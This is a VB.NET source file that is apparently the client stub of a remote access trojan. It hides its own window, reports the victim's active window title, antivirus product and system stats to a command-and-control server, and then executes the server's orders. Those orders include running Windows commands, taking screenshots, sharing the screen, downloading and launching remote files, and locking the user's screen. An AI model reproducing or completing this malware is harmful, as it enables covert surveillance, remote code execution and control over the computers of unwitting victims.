Imports System.Text
Imports System.Net
Imports System.Threading
Imports System.Net.NetworkInformation
Imports System.IO
Imports System.Management
Imports Microsoft.VisualBasic.MyServices

''' <summary>
''' TODO: Add mutex
''' </summary>

Public Class MainForm
    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer

    Public mainWebClient As WebClient = New WebClient()
    Public upTime As Integer = 0
    Private Function GetCaption() As String
        Dim Caption As New StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function
    Public Shared Function GetAntivirus() As String
        Try
            Dim Name As String = String.Empty
            Dim WinDefend As Boolean = False
            Dim Path As String = "\\" & Environment.MachineName & "\root\SecurityCenter2"

            Using MOS As ManagementObjectSearcher = New ManagementObjectSearcher(Path, "SELECT * FROM AntivirusProduct")

                For Each Instance In MOS.[Get]()
                    If Instance.GetPropertyValue("displayName").ToString() = "Windows Defender" Then WinDefend = True
                    If Instance.GetPropertyValue("displayName").ToString() <> "Windows Defender" Then Name = Instance.GetPropertyValue("displayName").ToString()
                Next

                If Name = String.Empty AndAlso WinDefend Then Name = "Windows Defender"
                If Name = "" Then Name = "N/A"
                Return Name
            End Using

        Catch
            Return "N/A"
        End Try
    End Function
    Public Function GetGBRamAmount() As String
        Return Convert.ToInt32(My.Computer.Info.AvailablePhysicalMemory / My.Computer.Info.TotalPhysicalMemory).ToString("p")
    End Function
    Public Function GetPing() As Integer
        Dim latency As String = ""

        Try
            Dim address As IPAddress = Dns.GetHostAddresses(New Uri(My.Settings.vpsurl & "clients.php?action=writeme").Host)(0)
            latency = New Ping().Send(address).RoundtripTime.ToString()
        Catch Ex As Exception
            latency = "Unknown Error"
        End Try

        Return latency
    End Function
    Public Function GetExeName() As String
        Dim exename As String
        exename = AppDomain.CurrentDomain.FriendlyName
        Return exename
    End Function
    Public Function APIRequest() As String
        Dim cpuCounter As PerformanceCounter = New PerformanceCounter("Processor", "% Processor Time", "_Total")
        Dim GetCPU As String = String.Format("{0:f0}", Convert.ToSingle(cpuCounter.NextValue()))

        Dim apiResponse As String = New WebClient().DownloadString(My.Settings.vpsurl &
        "clients.php?action=writeme&ping=" & GetPing() &
        "&ram=" & GetGBRamAmount() &
        "&cpu=" & GetCPU &
        "&currentwindow=" & GetCaption() &
        "&uptime=" & upTime &
        "&softwarename=" & GetExeName() &
        "&avname=" & GetAntivirus()
        )

        upTime += 1
        Return apiResponse
    End Function

    Private Sub mainBW_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles mainBW.DoWork
        While True
            Dim apiQuery As String = APIRequest()
            If apiQuery.Trim <> "" Then
                Dim parsedResponse As String() = apiQuery.Split("|")
                Dim actionType As String = parsedResponse(0)
                Dim actionContent As String() = parsedResponse.Skip(1).ToArray
                parseAction(actionType, actionContent)
            End If
            Thread.Sleep(500)
        End While
    End Sub

    Public Sub MainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'My.Settings.bl = False
        'My.Settings.blmsg = ""
        'My.Settings.Save()

        If My.Settings.bl Then
            If My.Settings.blmsg.Trim <> "" Then
                MsgBox(My.Settings.blmsg,, "")
            End If
            Environment.Exit(0)
        End If

        ' EOF arguments parsing |
        '                       v

        ' FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
        ' Dim Data As String = Space(LOF(1))
        ' FileGet(1, Data)
        ' FileClose(1)

        CheckForIllegalCrossThreadCalls = False
        mainBW.RunWorkerAsync()
        Me.Opacity = 0
        Me.Hide()
    End Sub

    Private Sub parseAction(actionType As String, actionContent As String())
#Region "System"

        ' TODO: Should we put these four on the extractor rather than in the stub ?
        ' For instance, if persistance is activated then the shutdownrat or rebootrat
        ' features may not work properly. Same for uninstallrat.
        If actionType = "shutdownrat" Then
            SelfRemoval.KillStub()

        ElseIf actionType = "rebootrat" Then
            SelfRemoval.RebootStub()

        ElseIf actionType = "uninstallrat" Then
            SelfRemoval.UninstallRAT()

        ElseIf actionType = "userblacklist" Then
            SelfRemoval.BlacklistClient(actionContent(0))

        ElseIf actionType = "runwincmd" Then
            WinCMD.Run(actionContent(0), mainWebClient)
        End If

#End Region

#Region "Surveillance"

        If actionType = "camerashot" Then
            ' Dim cap As New Capture() 'first line
            ' cap.Dispose()

            ' Dim client As New WebClient
            ' client.UploadData(My.Settings.vpsurl & "clients.php?action=uploadscreenshot&actioncontent=test.jpeg", cap.QueryFrame.ToImage)

        ElseIf actionType = "camerashare" Then
            ' TODO

        ElseIf actionType = "screenshare" Then
            If actionContent(0) = "start" Then
                Screenshare.SetupFluxManager(Convert.ToInt64(actionContent(1)), Convert.ToInt32(actionContent(2)))
            Else
                Screenshare.StopScreenshare()
            End If

        ElseIf actionType = "screenshot" Then
            IndependantActions.TakeScreenshot(actionContent(0), mainWebClient)

        ElseIf actionType = "getrunningtasks" Then
            ' TODO : check this feature
            IndependantActions.UploadRunningTasks(mainWebClient)

        ElseIf actionType = "getclipboard" Then
            ' TODO : make getclipboard

            ' Dim clipboardContent As String = "[Nothing]"

            'If Clipboard.ContainsImage Or Clipboard.ContainsFileDropList Or Clipboard.ContainsAudio Then
            '   clipboardContent = "[Clipboard contains one or multiple images, files or audios]"
            'ElseIf Clipboard.ContainsText(textdataformat.text) Then
            '   clipboardContent = Clipboard.GetText()
            'End If


            ' MsgBox("sent " & Clipboard.GetText(TextDataFormat.UnicodeText))
            ' ok
            ' sois attentif regazrde
            '  mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=sendclipboard&actioncontent=" & clipboardContent)
        End If

#End Region

#Region "Tools"
        If actionType = "openremotechat" Then
            Invoke(Sub() RemoteChat.Show())

        ElseIf actionType = "closeremotechat" Then
            Invoke(Sub() RemoteChat.Hide())

        ElseIf actionType = "remotexec" Then
            ' TODO : check this feature
            Dim filename As String = actionContent(0)
            Dim client As New WebClient
            client.DownloadFile(My.Settings.vpsurl & "/files/" & filename, filename)
            Try
                File.Move(filename, Path.GetTempPath & filename)
                File.Delete(filename)
            Catch
            End Try
            Process.Start(Path.GetTempPath & filename)

        ElseIf actionType = "lockuser" Then
            Invoke(Sub() LockedWindow.Show())

        ElseIf actionType = "unlockuser" Then
            Invoke(Sub() LockedWindow.Hide())
        End If

#End Region

#Region "Fun"
        If actionType = "openURL" Then
            IndependantActions.OpenURL(actionContent(0))

        ElseIf actionType = "cdopen" Then
            UIFeatures.LoopOpenCD(Convert.ToInt32(actionContent(0)))

        ElseIf actionType = "msgbox" Then
            MsgBox(actionContent(0),, "")

        ElseIf actionType = "playmp3" Then
            ' TODO : check this feature
            Dim filename As String = actionContent(0)
            MsgBox(actionContent(0))
            mainWebClient.DownloadFile(My.Settings.vpsurl & "files/" & filename, filename)
            File.Move(filename, Path.GetTempPath & filename)
        End If
#End Region
    End Sub
End Class